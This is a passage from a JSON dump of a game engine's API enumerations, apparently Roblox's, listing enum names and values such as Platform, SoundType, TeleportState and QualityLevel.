o","tags":[],"Value":1,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageWarning","tags":[],"Value":2,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageError","tags":[],"Value":3,"Enum":"MessageType"},{"type":"Enum","Name":"MouseBehavior","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCenter","tags":[],"Value":1,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCurrentPosition","tags":[],"Value":2,"Enum":"MouseBehavior"},{"type":"Enum","Name":"MoveState","tags":[]},{"type":"EnumItem","Name":"Stopped","tags":[],"Value":0,"Enum":"MoveState"},{"type":"EnumItem","Name":"Coasting","tags":[],"Value":1,"Enum":"MoveState"},{"type":"EnumItem","Name":"Pushing","tags":[],"Value":2,"Enum":"MoveState"},{"type":"EnumItem","Name":"Stopping","tags":[],"Value":3,"Enum":"MoveState"},{"type":"EnumItem","Name":"AirFree","tags":[],"Value":4,"Enum":"MoveState"},{"type":"Enum","Name":"NameOcclusion","tags":[]},{"type":"EnumItem","Name":"OccludeAll","tags":[],"Value":2,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"EnemyOcclusion","tags":[],"Value":1,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"NoOcclusion","tags":[],"Value":0,"Enum":"NameOcclusion"},{"type":"Enum","Name":"NetworkOwnership","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"NetworkOwnership"},{"type":"EnumItem","Name":"Manual","tags":[],"Value":1,"Enum":"NetworkOwnership"},{"type":"Enum","Name":"NormalId","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":1,"Enum":"NormalId"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":4,"Enum":"NormalId"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"NormalId"},{"type":"EnumItem","Name":"Front","tags":[],"Value":5,"Enum":"NormalId"},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"NormalId"},{"type":"EnumItem","Name":"Left","tags":[],"Value":3,"Enum":"NormalId"},{"type":"Enum","Name":"OverrideMouseIconBehavior","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceShow","tags":[],"Value":1,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceHide","tags":[],"Value":2,"Enum":"OverrideMouseIconBehavior"},{"type":"Enum","Name":"PacketPriority","tags":[]},{"type":"EnumItem","Name":"IMMEDIATE_PRIORITY","tags":[],"Value":0,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"HIGH_PRIORITY","tags":[],"Value":1,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"MEDIUM_PRIORITY","tags":[],"Value":2,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"LOW_PRIORITY","tags":[],"Value":3,"Enum":"PacketPriority"},{"type":"Enum","Name":"PacketReliability","tags":[]},{"type":"EnumItem","Name":"UNRELIABLE","tags":[],"Value":0,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"UNRELIABLE_SEQUENCED","tags":[],"Value":1,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE","tags":[],"Value":2,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_ORDERED","tags":[],"Value":3,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_SEQUENCED","tags":[],"Value":4,"Enum":"PacketReliability"},{"type":"Enum","Name":"PartType","tags":[]},{"type":"EnumItem","Name":"Ball","tags":[],"Value":0,"Enum":"PartType"},{"type":"EnumItem","Name":"Block","tags":[],"Value":1,"Enum":"PartType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":2,"Enum":"PartType"},{"type":"Enum","Name":"PathStatus","tags":[]},{"type":"EnumItem","Name":"Success","tags":[],"Value":0,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestNoPath","tags":[],"Value":1,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestOutOfRange","tags":[],"Value":2,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailStartNotEmpty","tags":[],"Value":3,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailFinishNotEmpty","tags":[],"Value":4,"Enum":"PathStatus"},{"type":"Enum","Name":"PhysicalPropertiesMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":1,"Enum":"PhysicalPropertiesMode"},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"PhysicalPropertiesMode"},{"type":"EnumItem","Name":"New","tags":[],"Value":2,"Enum":"PhysicalPropertiesMode"},{"type":"Enum","Name":"PhysicsReceiveMethod","tags":[]},{"type":"EnumItem","Name":"Direct","tags":[],"Value":0,"Enum":"PhysicsReceiveMethod"},{"type":"EnumItem","Name":"Interpolation","tags":[],"Value":1,"Enum":"PhysicsReceiveMethod"},{"type":"Enum","Name":"PhysicsSendMethod","tags":[]},{"type":"EnumItem","Name":"ErrorComputation","tags":[],"Value":0,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"ErrorComputation2","tags":[],"Value":1,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"RoundRobin","tags":[],"Value":2,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"TopNErrors","tags":[],"Value":3,"Enum":"PhysicsSendMethod"},{"type":"Enum","Name":"Platform","tags":[]},{"type":"EnumItem","Name":"Windows","tags":[],"Value":0,"Enum":"Platform"},{"type":"EnumItem","Name":"OSX","tags":[],"Value":1,"Enum":"Platform"},{"type":"EnumItem","Name":"IOS","tags":[],"Value":2,"Enum":"Platform"},{"type":"EnumItem","Name":"Android","tags":[],"Value":3,"Enum":"Platform"},{"type":"EnumItem","Name":"XBoxOne","tags":[],"Value":4,"Enum":"Platform"},{"type":"EnumItem","Name":"PS4","tags":[],"Value":5,"Enum":"Platform"},{"type":"EnumItem","Name":"PS3","tags":[],"Value":6,"Enum":"Platform"},{"type":"EnumItem","Name":"XBox360","tags":[],"Value":7,"Enum":"Platform"},{"type":"EnumItem","Name":"WiiU","tags":[],"Value":8,"Enum":"Platform"},{"type":"EnumItem","Name":"NX","tags":[],"Value":9,"Enum":"Platform"},{"type":"EnumItem","Name":"Ouya","tags":[],"Value":10,"Enum":"Platform"},{"type":"EnumItem","Name":"AndroidTV","tags":[],"Value":11,"Enum":"Platform"},{"type":"EnumItem","Name":"Chromecast","tags":[],"Value":12,"Enum":"Platform"},{"type":"EnumItem","Name":"Linux","tags":[],"Value":13,"Enum":"Platform"},{"type":"EnumItem","Name":"SteamOS","tags":[],"Value":14,"Enum":"Platform"},{"type":"EnumItem","Name":"WebOS","tags":[],"Value":15,"Enum":"Platform"},{"type":"EnumItem","Name":"DOS","tags":[],"Value":16,"Enum":"Platform"},{"type":"EnumItem","Name":"BeOS","tags":[],"Value":17,"Enum":"Platform"},{"type":"EnumItem","Name":"UWP","tags":[],"Value":18,"Enum":"Platform"},{"type":"EnumItem","Name":"None","tags":[],"Value":19,"Enum":"Platform"},{"type":"Enum","Name":"PlayerActions","tags":[]},{"type":"EnumItem","Name":"CharacterForward","tags":[],"Value":0,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterBackward","tags":[],"Value":1,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterLeft","tags":[],"Value":2,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterRight","tags":[],"Value":3,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterJump","tags":[],"Value":4,"Enum":"PlayerActions"},{"type":"Enum","Name":"PlayerChatType","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Team","tags":[],"Value":1,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Whisper","tags":[],"Value":2,"Enum":"PlayerChatType"},{"type":"Enum","Name":"PoseEasingDirection","tags":[]},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"PoseEasingDirection"},{"type":"Enum","Name":"PoseEasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":1,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":2,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Cubic","tags":[],"Value":3,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":4,"Enum":"PoseEasingStyle"},{"type":"Enum","Name":"PriorityMethod","tags":[]},{"type":"EnumItem","Name":"LastError","tags":[],"Value":0,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"AccumulatedError","tags":[],"Value":1,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"FIFO","tags":[],"Value":2,"Enum":"PriorityMethod"},{"type":"Enum","Name":"PrismSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PrismSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PrismSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PrismSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PrismSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PrismSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PrismSides"},{"type":"Enum","Name":"PrivilegeType","tags":[]},{"type":"EnumItem","Name":"Owner","tags":[],"Value":255,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Admin","tags":[],"Value":240,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Member","tags":[],"Value":128,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Visitor","tags":[],"Value":10,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Banned","tags":[],"Value":0,"Enum":"PrivilegeType"},{"type":"Enum","Name":"ProductPurchaseDecision","tags":[]},{"type":"EnumItem","Name":"NotProcessedYet","tags":[],"Value":0,"Enum":"ProductPurchaseDecision"},{"type":"EnumItem","Name":"PurchaseGranted","tags":[],"Value":1,"Enum":"ProductPurchaseDecision"},{"type":"Enum","Name":"PyramidSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PyramidSides"},{"type":"Enum","Name":"QualityLevel","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level01","tags":[],"Value":1,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level02","tags":[],"Value":2,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level03","tags":[],"Value":3,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level04","tags":[],"Value":4,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level05","tags":[],"Value":5,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level06","tags":[],"Value":6,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level07","tags":[],"Value":7,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level08","tags":[],"Value":8,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level09","tags":[],"Value":9,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level10","tags":[],"Value":10,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level11","tags":[],"Value":11,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level12","tags":[],"Value":12,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level13","tags":[],"Value":13,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level14","tags":[],"Value":14,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level15","tags":[],"Value":15,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level16","tags":[],"Value":16,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level17","tags":[],"Value":17,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level18","tags":[],"Value":18,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level19","tags":[],"Value":19,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level20","tags":[],"Value":20,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level21","tags":[],"Value":21,"Enum":"QualityLevel"},{"type":"Enum","Name":"RenderPriority","tags":[]},{"type":"EnumItem","Name":"First","tags":[],"Value":0,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Input","tags":[],"Value":100,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Camera","tags":[],"Value":200,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Character","tags":[],"Value":300,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Last","tags":[],"Value":2000,"Enum":"RenderPriority"},{"type":"Enum","Name":"Resolution","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Resolution"},{"type":"EnumItem","Name":"720x526","tags":[],"Value":1,"Enum":"Resolution"},{"type":"EnumItem","Name":"800x600","tags":[],"Value":2,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x600","tags":[],"Value":3,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x768","tags":[],"Value":4,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x720","tags":[],"Value":5,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x768","tags":[],"Value":6,"Enum":"Resolution"},{"type":"EnumItem","Name":"1152x864","tags":[],"Value":7,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x800","tags":[],"Value":8,"Enum":"Resolution"},{"type":"EnumItem","Name":"1360x768","tags":[],"Value":9,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x960","tags":[],"Value":10,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x1024","tags":[],"Value":11,"Enum":"Resolution"},{"type":"EnumItem","Name":"1440x900","tags":[],"Value":12,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x900","tags":[],"Value":13,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1024","tags":[],"Value":14,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1200","tags":[],"Value":15,"Enum":"Resolution"},{"type":"EnumItem","Name":"1680x1050","tags":[],"Value":16,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1080","tags":[],"Value":17,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1200","tags":[],"Value":18,"Enum":"Resolution"},{"type":"Enum","Name":"ReverbType","tags":[]},{"type":"EnumItem","Name":"NoReverb","tags":[],"Value":0,"Enum":"ReverbType"},{"type":"EnumItem","Name":"GenericReverb","tags":[],"Value":1,"Enum":"ReverbType"},{"type":"EnumItem","Name":"PaddedCell","tags":[],"Value":2,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Room","tags":[],"Value":3,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Bathroom","tags":[],"Value":4,"Enum":"ReverbType"},{"type":"EnumItem","Name":"LivingRoom","tags":[],"Value":5,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneRoom","tags":[],"Value":6,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Auditorium","tags":[],"Value":7,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ConcertHall","tags":[],"Value":8,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Cave","tags":[],"Value":9,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Arena","tags":[],"Value":10,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hangar","tags":[],"Value":11,"Enum":"ReverbType"},{"type":"EnumItem","Name":"CarpettedHallway","tags":[],"Value":12,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hallway","tags":[],"Value":13,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneCorridor","tags":[],"Value":14,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Alley","tags":[],"Value":15,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Forest","tags":[],"Value":16,"Enum":"ReverbType"},{"type":"EnumItem","Name":"City","tags":[],"Value":17,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Mountains","tags":[],"Value":18,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Quarry","tags":[],"Value":19,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Plain","tags":[],"Value":20,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ParkingLot","tags":[],"Value":21,"Enum":"ReverbType"},{"type":"EnumItem","Name":"SewerPipe","tags":[],"Value":22,"Enum":"ReverbType"},{"type":"EnumItem","Name":"UnderWater","tags":[],"Value":23,"Enum":"ReverbType"},{"type":"Enum","Name":"RollOffMode","tags":[]},{"type":"EnumItem","Name":"Inverse","tags":[],"Value":0,"Enum":"RollOffMode"},{"type":"EnumItem","Name":"Linear","tags":[],"Value":1,"Enum":"RollOffMode"},{"type":"Enum","Name":"RotationType","tags":[]},{"type":"EnumItem","Name":"MovementRelative","tags":[],"Value":0,"Enum":"RotationType"},{"type":"EnumItem","Name":"CameraRelative","tags":[],"Value":1,"Enum":"RotationType"},{"type":"Enum","Name":"RuntimeUndoBehavior","tags":[]},{"type":"EnumItem","Name":"Aggregate","tags":[],"Value":0,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Snapshot","tags":[],"Value":1,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Hybrid","tags":[],"Value":2,"Enum":"RuntimeUndoBehavior"},{"type":"Enum","Name":"SaveFilter","tags":[]},{"type":"EnumItem","Name":"SaveAll","tags":[],"Value":2,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveWorld","tags":[],"Value":0,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveGame","tags":[],"Value":1,"Enum":"SaveFilter"},{"type":"Enum","Name":"SavedQualitySetting","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel1","tags":[],"Value":1,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel2","tags":[],"Value":2,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel3","tags":[],"Value":3,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel4","tags":[],"Value":4,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel5","tags":[],"Value":5,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel6","tags":[],"Value":6,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel7","tags":[],"Value":7,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel8","tags":[],"Value":8,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel9","tags":[],"Value":9,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel10","tags":[],"Value":10,"Enum":"SavedQualitySetting"},{"type":"Enum","Name":"ScaleType","tags":[]},{"type":"EnumItem","Name":"Stretch","tags":[],"Value":0,"Enum":"ScaleType"},{"type":"EnumItem","Name":"Slice","tags":[],"Value":1,"Enum":"ScaleType"},{"type":"Enum","Name":"SizeConstraint","tags":[]},{"type":"EnumItem","Name":"RelativeXY","tags":[],"Value":0,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeXX","tags":[],"Value":1,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeYY","tags":[],"Value":2,"Enum":"SizeConstraint"},{"type":"Enum","Name":"SleepAdjustMethod","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"LastSample","tags":[],"Value":1,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"AverageInterval","tags":[],"Value":2,"Enum":"SleepAdjustMethod"},{"type":"Enum","Name":"SoundType","tags":[]},{"type":"EnumItem","Name":"NoSound","tags":[],"Value":0,"Enum":"SoundType"},{"type":"EnumItem","Name":"Boing","tags":[],"Value":1,"Enum":"SoundType"},{"type":"EnumItem","Name":"Bomb","tags":[],"Value":2,"Enum":"SoundType"},{"type":"EnumItem","Name":"Break","tags":[],"Value":3,"Enum":"SoundType"},{"type":"EnumItem","Name":"Click","tags":[],"Value":4,"Enum":"SoundType"},{"type":"EnumItem","Name":"Clock","tags":[],"Value":5,"Enum":"SoundType"},{"type":"EnumItem","Name":"Slingshot","tags":[],"Value":6,"Enum":"SoundType"},{"type":"EnumItem","Name":"Page","tags":[],"Value":7,"Enum":"SoundType"},{"type":"EnumItem","Name":"Ping","tags":[],"Value":8,"Enum":"SoundType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":9,"Enum":"SoundType"},{"type":"EnumItem","Name":"Splat","tags":[],"Value":10,"Enum":"SoundType"},{"type":"EnumItem","Name":"Step","tags":[],"Value":11,"Enum":"SoundType"},{"type":"EnumItem","Name":"StepOn","tags":[],"Value":12,"Enum":"SoundType"},{"type":"EnumItem","Name":"Swoosh","tags":[],"Value":13,"Enum":"SoundType"},{"type":"EnumItem","Name":"Victory","tags":[],"Value":14,"Enum":"SoundType"},{"type":"Enum","Name":"SpecialKey","tags":[]},{"type":"EnumItem","Name":"Insert","tags":[],"Value":0,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"Home","tags":[],"Value":1,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":3,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":4,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"ChatHotkey","tags":[],"Value":5,"Enum":"SpecialKey"},{"type":"Enum","Name":"Status","tags":[]},{"type":"EnumItem","Name":"Poison","tags":["deprecated"],"Value":0,"Enum":"Status"},{"type":"EnumItem","Name":"Confusion","tags":["deprecated"],"Value":1,"Enum":"Status"},{"type":"Enum","Name":"Stuff","tags":[]},{"type":"EnumItem","Name":"Heads","tags":[],"Value":0,"Enum":"Stuff"},{"type":"EnumItem","Name":"Faces","tags":[],"Value":1,"Enum":"Stuff"},{"type":"EnumItem","Name":"Hats","tags":[],"Value":2,"Enum":"Stuff"},{"type":"EnumItem","Name":"TShirts","tags":[],"Value":3,"Enum":"Stuff"},{"type":"EnumItem","Name":"Shirts","tags":[],"Value":4,"Enum":"Stuff"},{"type":"EnumItem","Name":"Pants","tags":[],"Value":5,"Enum":"Stuff"},{"type":"EnumItem","Name":"Gears","tags":[],"Value":6,"Enum":"Stuff"},{"type":"EnumItem","Name":"Torsos","tags":[],"Value":7,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftArms","tags":[],"Value":8,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightArms","tags":[],"Value":9,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftLegs","tags":[],"Value":10,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightLegs","tags":[],"Value":11,"Enum":"Stuff"},{"type":"EnumItem","Name":"Bodies","tags":[],"Value":12,"Enum":"Stuff"},{"type":"EnumItem","Name":"Costumes","tags":[],"Value":13,"Enum":"Stuff"},{"type":"Enum","Name":"Style","tags":[]},{"type":"EnumItem","Name":"AlternatingSupports","tags":[],"Value":0,"Enum":"Style"},{"type":"EnumItem","Name":"BridgeStyleSupports","tags":[],"Value":1,"Enum":"Style"},{"type":"EnumItem","Name":"NoSupports","tags":[],"Value":2,"Enum":"Style"},{"type":"Enum","Name":"SurfaceConstraint","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":1,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":2,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":3,"Enum":"SurfaceConstraint"},{"type":"Enum","Name":"SurfaceType","tags":[]},{"type":"EnumItem","Name":"Smooth","tags":[],"Value":0,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":1,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":2,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Studs","tags":[],"Value":3,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Inlet","tags":[],"Value":4,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Universal","tags":[],"Value":5,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":6,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":7,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":8,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Unjoinable","tags":[],"Value":9,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SmoothNoOutlines","tags":[],"Value":10,"Enum":"SurfaceType"},{"type":"Enum","Name":"SwipeDirection","tags":[]},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Left","tags":[],"Value":1,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Up","tags":[],"Value":2,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Down","tags":[],"Value":3,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"SwipeDirection"},{"type":"Enum","Name":"TeleportState","tags":[]},{"type":"EnumItem","Name":"RequestedFromServer","tags":[],"Value":0,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Started","tags":[],"Value":1,"Enum":"TeleportState"},{"type":"EnumItem","Name":"WaitingForServer","tags":[],"Value":2,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Failed","tags":[],"Value":3,"Enum":"TeleportState"},{"type":"EnumItem","Name":"InProgress","tags":[],"Value":4,"Enum":"TeleportState"},{"type":"Enum","Name":"TeleportType","tags":[]},{"type":"EnumItem","Name":"ToPlace","tags":[],"Value":0,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToInstance","tags":[],"Value":1,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToReservedServer","tags":[],"Value":2,"Enum":"TeleportType"},{"type":"Enum","Name":"TextXAlignment","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Right","tags":[],"Value":1,"Enum":"TextXAlignment"},{"type":"Enum","Name":"TextYAlignment","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TextYAlignment"},{"type":"Enum","Name":"ThreadPoolConfig","tags":[]},{"type":"EnumItem","Name":"Auto","tags":[],"Value":0,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore1","tags":[],"Value":101,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore2","tags":[],"Value":102,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore3","tags":[],"Value":103,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore4","tags":[],"Value":104,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads1","tags":[],"Value":1,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads2","tags":[],"Value":2,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads3","tags":[],"Value":3,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads4","tags":[],"Value":4,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads8","tags":[],"Value":8,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads16","tags":[],"Value":16,"Enum":"ThreadPoolConfig"},{"type":"Enum","Name":"ThrottlingPriority","tags":[]},{"type":"EnumItem","Name":"Extreme","tags":[],"Value":2,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"ElevatedOnServer","tags":[],"Value":1,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ThrottlingPriority"},{"type":"Enum","Name":"TickCountSampleMethod","tags":[]},{"type":"EnumItem","Name":"Fast","tags":[],"Value":0,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Benchmark","tags":[],"Value":1,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Precise","tags":[],"Value":2,"Enum":"TickCountSampleMethod"},{"type":"Enum","Name":"TopBottom","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TopBottom"},{"type":"Enum